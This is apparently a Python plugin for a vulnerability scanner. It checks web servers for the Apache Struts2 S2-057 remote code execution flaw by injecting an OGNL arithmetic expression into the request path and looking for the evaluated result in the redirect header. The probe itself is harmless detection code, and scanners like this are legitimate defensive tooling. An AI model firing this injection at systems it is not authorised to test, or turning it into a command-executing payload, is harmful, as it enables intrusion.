#!/usr/bin/env python
# coding=utf-8

from lib.poc.dummy import *


@http_scan
async def do_scan(ip, port, service, is_http, task_msg):

    poc = '/${(200000+333333)}'
    target = '{}://{}:{}{}/index.action'.format(service, ip, port, poc)
    # target = '{}://{}:{}/struts2-showcase{}/actionChain1!.action'.format(service, ip, port, poc)

    try:

        r = await http_client(ip, port).get(target, timeout=20)
        if r.headers.get('location', '').find('533333') > -1:
            ret = {
                'alert_group': 'Struts2 057 RCE',
                'affects': target,
                'details': 'Request {}\n'
                           'Url redirected to {}'.format(target, r.headers.get('location', ''))
            }
            return ret
    except Exception as e:
        debug(e)


if __name__ == '__main__':
    scan = do_scan('easypen-test.lijiejie.com', 8080, 'http', True, task_msg={})
    run_plugin_test(scan)
